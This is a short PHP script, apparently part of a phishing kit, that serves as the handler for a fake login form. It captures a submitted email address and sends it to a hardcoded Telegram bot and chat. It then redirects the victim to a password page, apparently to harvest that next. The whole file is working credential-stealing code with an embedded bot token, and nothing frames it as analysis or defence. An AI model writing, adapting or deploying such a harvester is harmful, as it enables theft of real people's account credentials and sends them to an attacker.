<?php
// sendmail.php

$bot_token = '8166415338:AAEd3Dpp4f_Yup_qtiIm7y4pw2HDATA_ZuA';
$chat_id = '-4625302890';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['username'] ?? '';

    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $message = "📧 New email submitted: $email";

        $url = "https://api.telegram.org/bot$bot_token/sendMessage";
        $data = [
            'chat_id' => $chat_id,
            'text' => $message,
            'parse_mode' => 'HTML'
        ];

        $options = [
            'http' => [
                'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                'method'  => 'POST',
                'content' => http_build_query($data),
            ],
        ];
        $context = stream_context_create($options);
        file_get_contents($url, false, $context);

        header('Location: ../pass.php?email=' . urlencode($email));
        exit;
    }
}

header('Location: ../index.php');
exit;
